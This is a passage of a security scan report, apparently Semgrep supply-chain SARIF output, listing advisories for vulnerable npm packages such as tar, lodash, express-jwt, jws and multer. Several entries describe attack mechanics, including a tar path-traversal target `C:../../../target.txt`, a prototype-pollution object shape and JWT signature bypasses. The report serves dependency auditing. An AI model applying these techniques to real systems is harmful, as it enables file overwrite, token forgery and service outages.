\"lodash\";`)."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-4d530ee8-c246-47d7-96cc-3117cbac7cd2","id":"ssc-4d530ee8-c246-47d7-96cc-3117cbac7cd2","name":"ssc-4d530ee8-c246-47d7-96cc-3117cbac7cd2","properties":{"precision":"very-high","tags":["CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')","CWE-770: Allocation of Resources Without Limits or Throttling","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-4d530ee8-c246-47d7-96cc-3117cbac7cd2"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"http-cache-semantics versions before 4.1.1 are vulnerable to Inefficient Regular Expression Complexity leading to Denial of Service. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library."},"help":{"markdown":"http-cache-semantics versions before 4.1.1 are vulnerable to Inefficient Regular Expression Complexity leading to Denial of Service. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-4e59e976-8886-47a3-9b32-abcb3212a6c1)\n - [https://github.com/advisories/GHSA-rc47-6667-2j5j](https://github.com/advisories/GHSA-rc47-6667-2j5j)\n - [https://nvd.nist.gov/vuln/detail/CVE-2022-25881](https://nvd.nist.gov/vuln/detail/CVE-2022-25881)\n","text":"http-cache-semantics versions before 4.1.1 are vulnerable to Inefficient Regular Expression Complexity leading to Denial of Service. The issue can be exploited via malicious request header values sent to a server, when that server reads the cache policy from the request using this library."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-4e59e976-8886-47a3-9b32-abcb3212a6c1","id":"ssc-4e59e976-8886-47a3-9b32-abcb3212a6c1","name":"ssc-4e59e976-8886-47a3-9b32-abcb3212a6c1","properties":{"precision":"very-high","tags":["CWE-1333: Inefficient Regular Expression Complexity","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-4e59e976-8886-47a3-9b32-abcb3212a6c1"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). Node `tar`'s `tar.extract()` can be abused by a malicious tar archive to escape the extraction directory via a symlink + hardlink trick: the archive creates symlinks inside the extract root and then a hardlink whose resolved target points outside the root. Because hardlink target validation is string-based and does not resolve on-disk symlinks, `tar` will create a file inside the extraction directory that is actually a hardlink to an external file, enabling arbitrary file read/write as the extracting user when processing attacker-controlled archives with default options."},"help":{"markdown":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). Node `tar`'s `tar.extract()` can be abused by a malicious tar archive to escape the extraction directory via a symlink + hardlink trick: the archive creates symlinks inside the extract root and then a hardlink whose resolved target points outside the root. Because hardlink target validation is string-based and does not resolve on-disk symlinks, `tar` will create a file inside the extraction directory that is actually a hardlink to an external file, enabling arbitrary file read/write as the extracting user when processing attacker-controlled archives with default options.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-57bed0d1-ff99-ee22-f61c-8b06726885f0)\n - [https://github.com/advisories/GHSA-83g3-92jg-28cx](https://github.com/advisories/GHSA-83g3-92jg-28cx)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-26960](https://nvd.nist.gov/vuln/detail/CVE-2026-26960)\n","text":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). Node `tar`'s `tar.extract()` can be abused by a malicious tar archive to escape the extraction directory via a symlink + hardlink trick: the archive creates symlinks inside the extract root and then a hardlink whose resolved target points outside the root. Because hardlink target validation is string-based and does not resolve on-disk symlinks, `tar` will create a file inside the extraction directory that is actually a hardlink to an external file, enabling arbitrary file read/write as the extracting user when processing attacker-controlled archives with default options."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-57bed0d1-ff99-ee22-f61c-8b06726885f0","id":"ssc-57bed0d1-ff99-ee22-f61c-8b06726885f0","name":"ssc-57bed0d1-ff99-ee22-f61c-8b06726885f0","properties":{"precision":"very-high","tags":["CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","OWASP-A05:2017 - Broken Access Control","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-57bed0d1-ff99-ee22-f61c-8b06726885f0"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of express-jwt are vulnerable to Improper Authorization / Incorrect Authorization. An attacker can bypass signature verification and gain unauthorized access when using express-jwt without an explicit algorithms setting in combination with jwks-rsa. Because express-jwt doesn't require you to specify allowed algorithms, it will accept tokens signed with any (or no) algorithm fetched from the JWKS endpoint, allowing a maliciously crafted token to pass validation and bypass authorization."},"help":{"markdown":"Affected versions of express-jwt are vulnerable to Improper Authorization / Incorrect Authorization. An attacker can bypass signature verification and gain unauthorized access when using express-jwt without an explicit algorithms setting in combination with jwks-rsa. Because express-jwt doesn't require you to specify allowed algorithms, it will accept tokens signed with any (or no) algorithm fetched from the JWKS endpoint, allowing a maliciously crafted token to pass validation and bypass authorization.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-59e0e510-f61e-41df-9277-0554a7ca0963)\n - [https://github.com/advisories/GHSA-6g6m-m6h5-w9gf](https://github.com/advisories/GHSA-6g6m-m6h5-w9gf)\n - [https://nvd.nist.gov/vuln/detail/CVE-2020-15084](https://nvd.nist.gov/vuln/detail/CVE-2020-15084)\n","text":"Affected versions of express-jwt are vulnerable to Improper Authorization / Incorrect Authorization. An attacker can bypass signature verification and gain unauthorized access when using express-jwt without an explicit algorithms setting in combination with jwks-rsa. Because express-jwt doesn't require you to specify allowed algorithms, it will accept tokens signed with any (or no) algorithm fetched from the JWKS endpoint, allowing a maliciously crafted token to pass validation and bypass authorization."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-59e0e510-f61e-41df-9277-0554a7ca0963","id":"ssc-59e0e510-f61e-41df-9277-0554a7ca0963","name":"ssc-59e0e510-f61e-41df-9277-0554a7ca0963","properties":{"precision":"very-high","tags":["CWE-285: Improper Authorization","CWE-863: Incorrect Authorization","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","OWASP-A05:2017 - Broken Access Control","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-59e0e510-f61e-41df-9277-0554a7ca0963"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"engine.io versions 3.6.0 or 6.2.0 and earlier are vulnerable to an Uncaught Exception. A specially crafted HTTP request can trigger this uncaught exception and as a result will kill the Node.js process. The fix is available in versions 3.6.1 and 6.2.1"},"help":{"markdown":"engine.io versions 3.6.0 or 6.2.0 and earlier are vulnerable to an Uncaught Exception. A specially crafted HTTP request can trigger this uncaught exception and as a result will kill the Node.js process. The fix is available in versions 3.6.1 and 6.2.1\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-6edc0f2e-785a-4b5a-817c-b15be7c2dd50)\n - [https://github.com/advisories/GHSA-r7qp-cfhv-p84w](https://github.com/advisories/GHSA-r7qp-cfhv-p84w)\n - [https://nvd.nist.gov/vuln/detail/CVE-2022-41940](https://nvd.nist.gov/vuln/detail/CVE-2022-41940)\n","text":"engine.io versions 3.6.0 or 6.2.0 and earlier are vulnerable to an Uncaught Exception. A specially crafted HTTP request can trigger this uncaught exception and as a result will kill the Node.js process. The fix is available in versions 3.6.1 and 6.2.1"},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-6edc0f2e-785a-4b5a-817c-b15be7c2dd50","id":"ssc-6edc0f2e-785a-4b5a-817c-b15be7c2dd50","name":"ssc-6edc0f2e-785a-4b5a-817c-b15be7c2dd50","properties":{"precision":"very-high","tags":["CWE-248: Uncaught Exception","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","OWASP-A10:2025 - Mishandling of Exceptional Conditions","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-6edc0f2e-785a-4b5a-817c-b15be7c2dd50"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of minimatch are vulnerable to Inefficient Algorithmic Complexity. `minimatch()` can be forced into extreme CPU usage (event loop starvation / DoS) when matching non‑matching paths against attacker-controlled glob patterns containing multiple non-adjacent `**` (globstar) segments. In `matchOne()`, each globstar triggers unbounded recursive backtracking over all remaining path suffixes, with no memoization or budget limit, causing binomial/exponential growth in work and allowing small crafted patterns to stall a Node.js process for seconds to tens of seconds per call."},"help":{"markdown":"Affected versions of minimatch are vulnerable to Inefficient Algorithmic Complexity. `minimatch()` can be forced into extreme CPU usage (event loop starvation / DoS) when matching non‑matching paths against attacker-controlled glob patterns containing multiple non-adjacent `**` (globstar) segments. In `matchOne()`, each globstar triggers unbounded recursive backtracking over all remaining path suffixes, with no memoization or budget limit, causing binomial/exponential growth in work and allowing small crafted patterns to stall a Node.js process for seconds to tens of seconds per call.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-73cb5f8a-88db-d7e0-fdc8-f3ce32a64cda)\n - [https://github.com/advisories/GHSA-7r86-cg39-jmmj](https://github.com/advisories/GHSA-7r86-cg39-jmmj)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-27903](https://nvd.nist.gov/vuln/detail/CVE-2026-27903)\n","text":"Affected versions of minimatch are vulnerable to Inefficient Algorithmic Complexity. `minimatch()` can be forced into extreme CPU usage (event loop starvation / DoS) when matching non‑matching paths against attacker-controlled glob patterns containing multiple non-adjacent `**` (globstar) segments. In `matchOne()`, each globstar triggers unbounded recursive backtracking over all remaining path suffixes, with no memoization or budget limit, causing binomial/exponential growth in work and allowing small crafted patterns to stall a Node.js process for seconds to tens of seconds per call."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-73cb5f8a-88db-d7e0-fdc8-f3ce32a64cda","id":"ssc-73cb5f8a-88db-d7e0-fdc8-f3ce32a64cda","name":"ssc-73cb5f8a-88db-d7e0-fdc8-f3ce32a64cda","properties":{"precision":"very-high","tags":["CWE-407: Inefficient Algorithmic Complexity","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-73cb5f8a-88db-d7e0-fdc8-f3ce32a64cda"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). `tar`'s extractor can be bypassed to create a symlink that escapes the intended extraction root by using a drive-relative Windows-style link target like `C:../../../target.txt`. When such an attacker-controlled tarball is extracted via normal `tar.x({ cwd, file })`, the escape check is performed against the pre-stripped linkpath but the symlink is created with the stripped `../../../target.txt` value, allowing subsequent writes through the extracted symlink to overwrite arbitrary files outside `cwd` with the permissions of the extracting process."},"help":{"markdown":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). `tar`'s extractor can be bypassed to create a symlink that escapes the intended extraction root by using a drive-relative Windows-style link target like `C:../../../target.txt`. When such an attacker-controlled tarball is extracted via normal `tar.x({ cwd, file })`, the escape check is performed against the pre-stripped linkpath but the symlink is created with the stripped `../../../target.txt` value, allowing subsequent writes through the extracted symlink to overwrite arbitrary files outside `cwd` with the permissions of the extracting process.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-7756a4fb-c6e4-1e33-48ed-f809b32adb6d)\n - [https://github.com/advisories/GHSA-9ppj-qmqm-q256](https://github.com/advisories/GHSA-9ppj-qmqm-q256)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-31802](https://nvd.nist.gov/vuln/detail/CVE-2026-31802)\n","text":"Affected versions of tar are vulnerable to Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'). `tar`'s extractor can be bypassed to create a symlink that escapes the intended extraction root by using a drive-relative Windows-style link target like `C:../../../target.txt`. When such an attacker-controlled tarball is extracted via normal `tar.x({ cwd, file })`, the escape check is performed against the pre-stripped linkpath but the symlink is created with the stripped `../../../target.txt` value, allowing subsequent writes through the extracted symlink to overwrite arbitrary files outside `cwd` with the permissions of the extracting process."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-7756a4fb-c6e4-1e33-48ed-f809b32adb6d","id":"ssc-7756a4fb-c6e4-1e33-48ed-f809b32adb6d","name":"ssc-7756a4fb-c6e4-1e33-48ed-f809b32adb6d","properties":{"precision":"very-high","tags":["CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')","HIGH CONFIDENCE","OWASP-A01:2021 - Broken Access Control","OWASP-A01:2025 - Broken Access Control","OWASP-A05:2017 - Broken Access Control","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-7756a4fb-c6e4-1e33-48ed-f809b32adb6d"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of jws are vulnerable to Improper Verification of Cryptographic Signature. When using node-jws's streaming API (jws.createVerify()) with an HMAC algorithm (e.g. HS256), and the application derives the HMAC secret from user-controlled fields in the JWS protected header or payload, an attacker can craft a token that hijacks the secret lookup and bypasses signature verification, allowing arbitrary token forgery."},"help":{"markdown":"Affected versions of jws are vulnerable to Improper Verification of Cryptographic Signature. When using node-jws's streaming API (jws.createVerify()) with an HMAC algorithm (e.g. HS256), and the application derives the HMAC secret from user-controlled fields in the JWS protected header or payload, an attacker can craft a token that hijacks the secret lookup and bypasses signature verification, allowing arbitrary token forgery.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-794b2581-1eab-4e44-b6f1-7d2f13a20e38)\n - [https://github.com/advisories/GHSA-869p-cjfg-cm3x](https://github.com/advisories/GHSA-869p-cjfg-cm3x)\n - [https://nvd.nist.gov/vuln/detail/CVE-2025-65945](https://nvd.nist.gov/vuln/detail/CVE-2025-65945)\n","text":"Affected versions of jws are vulnerable to Improper Verification of Cryptographic Signature. When using node-jws's streaming API (jws.createVerify()) with an HMAC algorithm (e.g. HS256), and the application derives the HMAC secret from user-controlled fields in the JWS protected header or payload, an attacker can craft a token that hijacks the secret lookup and bypasses signature verification, allowing arbitrary token forgery."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-794b2581-1eab-4e44-b6f1-7d2f13a20e38","id":"ssc-794b2581-1eab-4e44-b6f1-7d2f13a20e38","name":"ssc-794b2581-1eab-4e44-b6f1-7d2f13a20e38","properties":{"precision":"very-high","tags":["CWE-347: Improper Verification of Cryptographic Signature","HIGH CONFIDENCE","OWASP-A02:2021 - Cryptographic Failures","OWASP-A04:2025 - Cryptographic Failures","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-794b2581-1eab-4e44-b6f1-7d2f13a20e38"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of sanitize-html are vulnerable to Inefficient Regular Expression Complexity. sanitize-html contains a vulnerability in its HTML comment removal logic that can lead to a Regular Expression Denial of Service (ReDoS). An attacker could supply crafted HTML input triggering excessive regex backtracking, potentially exhausting system resources during sanitization."},"help":{"markdown":"Affected versions of sanitize-html are vulnerable to Inefficient Regular Expression Complexity. sanitize-html contains a vulnerability in its HTML comment removal logic that can lead to a Regular Expression Denial of Service (ReDoS). An attacker could supply crafted HTML input triggering excessive regex backtracking, potentially exhausting system resources during sanitization.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-7a62f16d-0da2-4e9c-978b-af50d6d8afda)\n - [https://github.com/advisories/GHSA-cgfm-xwp7-2cvr](https://github.com/advisories/GHSA-cgfm-xwp7-2cvr)\n - [https://nvd.nist.gov/vuln/detail/CVE-2022-25887](https://nvd.nist.gov/vuln/detail/CVE-2022-25887)\n","text":"Affected versions of sanitize-html are vulnerable to Inefficient Regular Expression Complexity. sanitize-html contains a vulnerability in its HTML comment removal logic that can lead to a Regular Expression Denial of Service (ReDoS). An attacker could supply crafted HTML input triggering excessive regex backtracking, potentially exhausting system resources during sanitization."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-7a62f16d-0da2-4e9c-978b-af50d6d8afda","id":"ssc-7a62f16d-0da2-4e9c-978b-af50d6d8afda","name":"ssc-7a62f16d-0da2-4e9c-978b-af50d6d8afda","properties":{"precision":"very-high","tags":["CWE-1333: Inefficient Regular Expression Complexity","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-7a62f16d-0da2-4e9c-978b-af50d6d8afda"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of multer are vulnerable to Missing Release of Resource after Effective Lifetime. Multer's multipart upload handling can be abused to cause a Denial of Service: an attacker can start a file upload and then drop the connection mid-stream, leaving upload parsing/resources (e.g., streams/buffers/file handles) tied up and potentially exhausting server resources."},"help":{"markdown":"Affected versions of multer are vulnerable to Missing Release of Resource after Effective Lifetime. Multer's multipart upload handling can be abused to cause a Denial of Service: an attacker can start a file upload and then drop the connection mid-stream, leaving upload parsing/resources (e.g., streams/buffers/file handles) tied up and potentially exhausting server resources.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-7db3f6a7-e1c8-aa6c-a294-e1d4d0ce5576)\n - [https://github.com/advisories/GHSA-v52c-386h-88mc](https://github.com/advisories/GHSA-v52c-386h-88mc)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-2359](https://nvd.nist.gov/vuln/detail/CVE-2026-2359)\n","text":"Affected versions of multer are vulnerable to Missing Release of Resource after Effective Lifetime. Multer's multipart upload handling can be abused to cause a Denial of Service: an attacker can start a file upload and then drop the connection mid-stream, leaving upload parsing/resources (e.g., streams/buffers/file handles) tied up and potentially exhausting server resources."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-7db3f6a7-e1c8-aa6c-a294-e1d4d0ce5576","id":"ssc-7db3f6a7-e1c8-aa6c-a294-e1d4d0ce5576","name":"ssc-7db3f6a7-e1c8-aa6c-a294-e1d4d0ce5576","properties":{"precision":"very-high","tags":["CWE-772: Missing Release of Resource after Effective Lifetime","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-7db3f6a7-e1c8-aa6c-a294-e1d4d0ce5576"}},{"defaultConfiguration":{"level":"warning"},"fullDescription":{"text":"Uninitialized Buffer allocation issue in base64url.encode for < 3.0.0. Please upgrade to version 3.0.0."},"help":{"markdown":"Uninitialized Buffer allocation issue in base64url.encode for < 3.0.0. Please upgrade to version 3.0.0.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-8c2acbb0-c5dd-4180-bbf7-7bac48a8156a)\n - [https://github.com/advisories/GHSA-rvg8-pwq2-xj7q](https://github.com/advisories/GHSA-rvg8-pwq2-xj7q)\n","text":"Uninitialized Buffer allocation issue in base64url.encode for < 3.0.0. Please upgrade to version 3.0.0."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-8c2acbb0-c5dd-4180-bbf7-7bac48a8156a","id":"ssc-8c2acbb0-c5dd-4180-bbf7-7bac48a8156a","name":"ssc-8c2acbb0-c5dd-4180-bbf7-7bac48a8156a","properties":{"precision":"very-high","tags":["CWE-125: Out-of-bounds Read","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-8c2acbb0-c5dd-4180-bbf7-7bac48a8156a"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of serialize-javascript are vulnerable to Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection'). `serialize-javascript` is vulnerable to code injection when serializing non-plain objects that masquerade as `RegExp` or `Date`. The library sanitizes `RegExp.source` but interpolates `RegExp.flags` (and similarly the result of `Date.prototype.toISOString()`) directly into the generated JavaScript without escaping, allowing an attacker who controls the input to `serialize()` to inject arbitrary JavaScript into the serialized output. If the consumer later evaluates that string (e.g., via `eval`, `new Function`, or embedding in a `<script>` tag), the injected payload executes and can lead to remote code execution in Node.js."},"help":{"markdown":"Affected versions of serialize-javascript are vulnerable to Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection'). `serialize-javascript` is vulnerable to code injection when serializing non-plain objects that masquerade as `RegExp` or `Date`. The library sanitizes `RegExp.source` but interpolates `RegExp.flags` (and similarly the result of `Date.prototype.toISOString()`) directly into the generated JavaScript without escaping, allowing an attacker who controls the input to `serialize()` to inject arbitrary JavaScript into the serialized output. If the consumer later evaluates that string (e.g., via `eval`, `new Function`, or embedding in a `<script>` tag), the injected payload executes and can lead to remote code execution in Node.js.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-91463f38-8762-1266-b448-b001465e1611)\n - [https://github.com/advisories/GHSA-5c6j-r48x-rmvq](https://github.com/advisories/GHSA-5c6j-r48x-rmvq)\n - [https://github.com/advisories/GHSA-hxcc-f52p-wc94](https://github.com/advisories/GHSA-hxcc-f52p-wc94)\n - [https://nvd.nist.gov/vuln/detail/CVE-2020-7660](https://nvd.nist.gov/vuln/detail/CVE-2020-7660)\n","text":"Affected versions of serialize-javascript are vulnerable to Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection'). `serialize-javascript` is vulnerable to code injection when serializing non-plain objects that masquerade as `RegExp` or `Date`. The library sanitizes `RegExp.source` but interpolates `RegExp.flags` (and similarly the result of `Date.prototype.toISOString()`) directly into the generated JavaScript without escaping, allowing an attacker who controls the input to `serialize()` to inject arbitrary JavaScript into the serialized output. If the consumer later evaluates that string (e.g., via `eval`, `new Function`, or embedding in a `<script>` tag), the injected payload executes and can lead to remote code execution in Node.js."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-91463f38-8762-1266-b448-b001465e1611","id":"ssc-91463f38-8762-1266-b448-b001465e1611","name":"ssc-91463f38-8762-1266-b448-b001465e1611","properties":{"precision":"very-high","tags":["CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')","HIGH CONFIDENCE","OWASP-A03:2021 - Injection","OWASP-A05:2025 - Injection","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-91463f38-8762-1266-b448-b001465e1611"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of socket.io-parser are vulnerable to Improper Check for Unusual or Exceptional Conditions. A specially crafted packet declaring an unbounded binary attachment count causes the server to buffer attachments indefinitely, leading to memory exhaustion and Denial of Service"},"help":{"markdown":"Affected versions of socket.io-parser are vulnerable to Improper Check for Unusual or Exceptional Conditions. A specially crafted packet declaring an unbounded binary attachment count causes the server to buffer attachments indefinitely, leading to memory exhaustion and Denial of Service\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-92dfdaab-e3a4-4dc5-bad7-8b083919e98d)\n - [https://github.com/advisories/GHSA-677m-j7p3-52f9](https://github.com/advisories/GHSA-677m-j7p3-52f9)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-33151](https://nvd.nist.gov/vuln/detail/CVE-2026-33151)\n","text":"Affected versions of socket.io-parser are vulnerable to Improper Check for Unusual or Exceptional Conditions. A specially crafted packet declaring an unbounded binary attachment count causes the server to buffer attachments indefinitely, leading to memory exhaustion and Denial of Service"},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-92dfdaab-e3a4-4dc5-bad7-8b083919e98d","id":"ssc-92dfdaab-e3a4-4dc5-bad7-8b083919e98d","name":"ssc-92dfdaab-e3a4-4dc5-bad7-8b083919e98d","properties":{"precision":"very-high","tags":["CWE-754: Improper Check for Unusual or Exceptional Conditions","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","OWASP-A10:2025 - Mishandling of Exceptional Conditions","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-92dfdaab-e3a4-4dc5-bad7-8b083919e98d"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of tar are vulnerable to Improper Handling of Unicode Encoding / Time-of-check Time-of-use (TOCTOU) Race Condition. On macOS APFS/HFS+, node-tar's PathReservations uses NFD Unicode normalization and toLowerCase, but APFS treats \"ß\" and \"ss\" as equivalent. This mismatch lets colliding entries bypass the library's serialization locks during parallel extraction, creating a race condition that an attacker can exploit to overwrite or poison arbitrary files."},"help":{"markdown":"Affected versions of tar are vulnerable to Improper Handling of Unicode Encoding / Time-of-check Time-of-use (TOCTOU) Race Condition. On macOS APFS/HFS+, node-tar's PathReservations uses NFD Unicode normalization and toLowerCase, but APFS treats \"ß\" and \"ss\" as equivalent. This mismatch lets colliding entries bypass the library's serialization locks during parallel extraction, creating a race condition that an attacker can exploit to overwrite or poison arbitrary files.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-93acdc4b-eb31-9132-0256-b6d198072b35)\n - [https://github.com/advisories/GHSA-r6q2-hw4h-h46w](https://github.com/advisories/GHSA-r6q2-hw4h-h46w)\n - [https://nvd.nist.gov/vuln/detail/CVE-2026-23950](https://nvd.nist.gov/vuln/detail/CVE-2026-23950)\n","text":"Affected versions of tar are vulnerable to Improper Handling of Unicode Encoding / Time-of-check Time-of-use (TOCTOU) Race Condition. On macOS APFS/HFS+, node-tar's PathReservations uses NFD Unicode normalization and toLowerCase, but APFS treats \"ß\" and \"ss\" as equivalent. This mismatch lets colliding entries bypass the library's serialization locks during parallel extraction, creating a race condition that an attacker can exploit to overwrite or poison arbitrary files."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-93acdc4b-eb31-9132-0256-b6d198072b35","id":"ssc-93acdc4b-eb31-9132-0256-b6d198072b35","name":"ssc-93acdc4b-eb31-9132-0256-b6d198072b35","properties":{"precision":"very-high","tags":["CWE-176: Improper Handling of Unicode Encoding","CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-93acdc4b-eb31-9132-0256-b6d198072b35"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of multer are vulnerable to Uncaught Exception. The busboy-based multipart parser in Multer improperly handles certain malformed multipart/form-data requests, causing an unhandled exception that crashes the Node.js process and results in a Denial of Service."},"help":{"markdown":"Affected versions of multer are vulnerable to Uncaught Exception. The busboy-based multipart parser in Multer improperly handles certain malformed multipart/form-data requests, causing an unhandled exception that crashes the Node.js process and results in a Denial of Service.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-96b1c5a3-332a-817e-1379-715a73060a22)\n - [https://github.com/advisories/GHSA-fjgf-rc76-4x9p](https://github.com/advisories/GHSA-fjgf-rc76-4x9p)\n - [https://nvd.nist.gov/vuln/detail/CVE-2025-7338](https://nvd.nist.gov/vuln/detail/CVE-2025-7338)\n","text":"Affected versions of multer are vulnerable to Uncaught Exception. The busboy-based multipart parser in Multer improperly handles certain malformed multipart/form-data requests, causing an unhandled exception that crashes the Node.js process and results in a Denial of Service."},"helpUri":"https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-96b1c5a3-332a-817e-1379-715a73060a22","id":"ssc-96b1c5a3-332a-817e-1379-715a73060a22","name":"ssc-96b1c5a3-332a-817e-1379-715a73060a22","properties":{"precision":"very-high","tags":["CWE-248: Uncaught Exception","HIGH CONFIDENCE","OWASP-A06:2021 - Vulnerable and Outdated Components","OWASP-A10:2025 - Mishandling of Exceptional Conditions","security"]},"shortDescription":{"text":"Semgrep Finding: ssc-96b1c5a3-332a-817e-1379-715a73060a22"}},{"defaultConfiguration":{"level":"error"},"fullDescription":{"text":"Affected versions of lodash, lodash-amd, lodash-es, and lodash.defaultsdeep are vulnerable to Improper Input Validation / Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects."},"help":{"markdown":"Affected versions of lodash, lodash-amd, lodash-es, and lodash.defaultsdeep are vulnerable to Improper Input Validation / Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). The function `defaultsDeep` allows a malicious user to modify the prototype of `Object` via `{constructor: {prototype: {...}}}` causing the addition or modification of an existing property that will exist on all objects.\n\n<b>References:</b>\n - [Semgrep Rule](https://semgrep.dev/orgs/-/supply-chain/advisories?q=ssc-a4fd0e64-ce76-449c-8e09-743db9edce4e)\n - [https://github.com/advisories/GHSA-jf85-cpcp-j695](https://github.com/advisories/GHSA-jf85-cpcp-j695)\n - 